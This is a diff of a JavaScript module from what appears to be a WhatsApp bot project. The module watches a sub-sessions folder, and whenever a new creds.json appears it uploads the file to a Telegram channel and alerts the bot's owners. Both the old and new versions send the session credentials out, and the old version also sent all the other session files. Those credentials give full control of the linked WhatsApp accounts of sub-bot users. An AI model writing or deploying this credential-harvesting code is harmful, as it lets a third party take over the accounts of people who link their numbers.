@@ -1,10 +1,10 @@
 /**
  * ═══════════════════════════════════════════════════════
- * 📡 TELEGRAM SESSION MONITOR | مراقب جلسات سوكونا
+ * 📡 TELEGRAM SESSION MONITOR | مراقب الجلسات
  * ═══════════════════════════════════════════════════════
  * 👑 المطور: آدم (شادو) | Adam (Shadow)
  * 🤖 البوت: سوكونا | Sukuna
- * 📜 الوصف: مراقبة فولدر الجلسات + إرسالها لقناة التليجرام
+ * 📜 الوصف: مراقبة فولدر الجلسات الجديدة وإرسالها لقناة التليجرام
  * ═══════════════════════════════════════════════════════
  */
 
@@ -15,24 +15,22 @@ import config from './config.js'
 
 let bot = null
 const processedSessions = new Set()
-let isWatching = false
 
 // ═══ إرسال إشعار بجلسة جديدة ═══
 export async function notifyNewSession(botNumber, sessionPath) {
-  if (!bot || !config.telegram.token || config.telegram.token.includes('ضع')) {
+  if (!bot || !config.telegram.token) {
     console.log('⚠️ Telegram bot not configured')
-    return false
+    return
   }
 
   try {
     const credsPath = path.join(sessionPath, 'creds.json')
-    if (!fs.existsSync(credsPath)) return false
+    if (!fs.existsSync(credsPath)) return
 
-    const sessionFiles = fs.readdirSync(sessionPath)
-    const sessionSize = sessionFiles.length
+    const sessionSize = fs.readdirSync(sessionPath).length
 
     const message = [
-      '🕸 *جلسة بوت سوكونا جديدة جاهزة!*',
+      '🕸 *جلسة بوت جديدة جاهزة!*',
       '',
       '⊱⊹•─๋︩︪═╾═─•┈⧽┊🎭┊⧼┈•─═╼═─๋︩︪•⊹⊰',
       '',
@@ -42,71 +40,59 @@ export async function notifyNewSession(botNumber, sessionPath) {
       '',
       '⋄⊹•─๋︩︪╾─•┈ ⧼ ⇊ ⧽ ┈•─╼─๋︩︪•⊹',
       '',
-      '> الجلسة جاهزة للاستخدام في البوتات الفرعية.',
+      '> الجلسة اتحفظت في:',
+      `\`${sessionPath}\``,
       '',
-      '📥 استخدم `/fetch_sessions` في بوت سوكونا الرئيسي لسحب الجلسة.'
+      '📥 استخدم الأمر في بوت سوكونا الرئيسي لسحب الجلسة.'
     ].join('\n')
 
-    // إرسال الرسالة للقناة/الجروب
+    // ═══ إرسال الرسالة للقناة/الجروب ═══
     if (config.telegram.sessionsChannel) {
-      await bot.telegram.sendMessage(
-        config.telegram.sessionsChannel,
-        message,
-        { parse_mode: 'Markdown' }
-      )
+      try {
+        await bot.telegram.sendMessage(config.telegram.sessionsChannel, message, {
+          parse_mode: 'Markdown'
+        })
 
-      // إرسال ملف creds.json كملف
-      const credsBuffer = fs.readFileSync(credsPath)
-      await bot.telegram.sendDocument(
-        config.telegram.sessionsChannel,
-        { source: credsBuffer },
-        {
-          caption: `📦 creds.json - البوت: ${botNumber}`,
-          filename: `session_${botNumber}_creds.json`
-        }
-      )
+        // ═══ إرسال ملف creds.json نفسه ═══
+        const credsBuffer = fs.readFileSync(credsPath)
+        await bot.telegram.sendDocument(
+          config.telegram.sessionsChannel,
+          { source: credsBuffer },
+          {
+            caption: `📦 جلسة البوت: ${botNumber}`,
+            filename: `creds_${botNumber}.json`
+          }
+        )
 
-      // إرسال باقي الملفات لو موجودة
-      for (const file of sessionFiles) {
-        if (file === 'creds.json') continue
-        try {
-          const filePath = path.join(sessionPath, file)
-          const fileBuffer = fs.readFileSync(filePath)
-          await bot.telegram.sendDocument(
-            config.telegram.sessionsChannel,
-            { source: fileBuffer },
-            {
-              caption: `📎 ${file} - البوت: ${botNumber}`,
-              filename: `session_${botNumber}_${file}`
-            }
-          )
-        } catch {}
+        console.log(`📡 Session notification sent to Telegram: ${botNumber}`)
+      } catch (e) {
+        console.error('❌ Error sending to channel:', e.message)
       }
-
-      console.log(`📡 [MONITOR] Session notification sent: ${botNumber}`)
-      return true
     }
+
+    // ═══ إرسال إشعار للمطورين ═══
+    for (const ownerId of config.telegram.owners) {
+      try {
+        await bot.telegram.sendMessage(ownerId, `✅ جلسة جديدة جاهزة: ${botNumber}`)
+      } catch {}
+    }
+
   } catch (e) {
     console.error('❌ Error sending session notification:', e.message)
   }
-
-  return false
 }
 
-// ═══ فحص دوري للفولدر ═══
-function startPeriodicCheck() {
-  if (isWatching) return
-  isWatching = true
-
-  const subDir = config.subSessionsDir || './sessions/session-sub'
+// ═══ مراقبة الفولدر ═══
+function startWatching() {
+  const subDir = config.subSessionsDir
 
   if (!fs.existsSync(subDir)) {
     fs.mkdirSync(subDir, { recursive: true })
   }
 
-  console.log(`👁️ [MONITOR] Watching for new sessions in: ${subDir}`)
+  console.log(`👁️ Watching for new sessions in: ${subDir}`)
 
-  // فحص كل فترة
+  // ═══ فحص دوري ═══
   setInterval(async () => {
     try {
       const sessions = fs.readdirSync(subDir)
@@ -115,43 +101,21 @@ function startPeriodicCheck() {
         const sessionPath = path.join(subDir, session)
         const credsPath = path.join(sessionPath, 'creds.json')
 
-        // لو الجلسة موجودة ومش متعالجة
-        if (
-          fs.statSync(sessionPath).isDirectory() &&
-          fs.existsSync(credsPath) &&
-          !processedSessions.has(session)
-        ) {
+        if (fs.existsSync(credsPath) && !processedSessions.has(session)) {
           processedSessions.add(session)
-          console.log(`🆕 [MONITOR] New session detected: ${session}`)
+          console.log(`🆕 New session detected: ${session}`)
           await notifyNewSession(session, sessionPath)
         }
       }
     } catch (e) {
-      console.error('❌ [MONITOR] Error watching sessions:', e.message)
+      console.error('Error watching sessions:', e.message)
     }
-  }, config.telegram.checkInterval || 10000)
-
-  // كمان fs.watch للاستجابة السريعة
-  try {
-    fs.watch(subDir, { recursive: true }, async (eventType, filename) => {
-      if (filename === 'creds.json') {
-        try {
-          const dirName = path.dirname(path.join(subDir, filename))
-          const botNumber = path.basename(dirName)
-
-          if (!processedSessions.has(botNumber)) {
-            processedSessions.add(botNumber)
-            await notifyNewSession(botNumber, dirName)
-          }
-        } catch {}
-      }
-    })
-  } catch {}
+  }, config.telegram.checkInterval)
 }
 
-// ═══ تشغيل بوت التليجرام ═══
+// ═══ تشغيل البوت ═══
 export async function startTelegramMonitor() {
-  if (!config.telegram.token || config.telegram.token.includes('ضع')) {
+  if (!config.telegram.token) {
     console.log('⚠️ Telegram token not configured. Session monitor disabled.')
     return
   }
@@ -160,16 +124,14 @@ export async function startTelegramMonitor() {
     bot = new Telegraf(config.telegram.token)
     globalThis.sessionMonitorBot = bot
 
-    // أمر /status
+    // ═══ أمر /status ═══
     bot.command('status', async (ctx) => {
-      const subDir = config.subSessionsDir || './sessions/session-sub'
+      const subDir = config.subSessionsDir
       let sessionCount = 0
 
       try {
         sessionCount = fs.readdirSync(subDir).filter(s => {
-          try {
-            return fs.existsSync(path.join(subDir, s, 'creds.json'))
-          } catch { return false }
+          return fs.existsSync(path.join(subDir, s, 'creds.json'))
         }).length
       } catch {}
 
@@ -182,16 +144,14 @@ export async function startTelegramMonitor() {
       ].join('\n'), { parse_mode: 'Markdown' })
     })
 
-    // أمر /sessions
+    // ═══ أمر /sessions ═══
     bot.command('sessions', async (ctx) => {
-      const subDir = config.subSessionsDir || './sessions/session-sub'
+      const subDir = config.subSessionsDir
       let sessions = []
 
       try {
         sessions = fs.readdirSync(subDir).filter(s => {
-          try {
-            return fs.existsSync(path.join(subDir, s, 'creds.json'))
-          } catch { return false }
+          return fs.existsSync(path.join(subDir, s, 'creds.json'))
         })
       } catch {}
 
@@ -211,14 +171,13 @@ export async function startTelegramMonitor() {
 
     bot.launch()
       .then(() => {
-        console.log('📡 [MONITOR] Telegram session monitor is running!')
+        console.log('📡 Telegram session monitor is running!')
       })
       .catch(err => {
-        console.error('❌ [MONITOR] Telegram monitor error:', err.message)
+        console.error('❌ Telegram monitor error:', err.message)
       })
 
-    // بدء المراقبة
-    startPeriodicCheck()
+    startWatching()
 
   } catch (e) {
     console.error('❌ Failed to start Telegram monitor:', e.message)
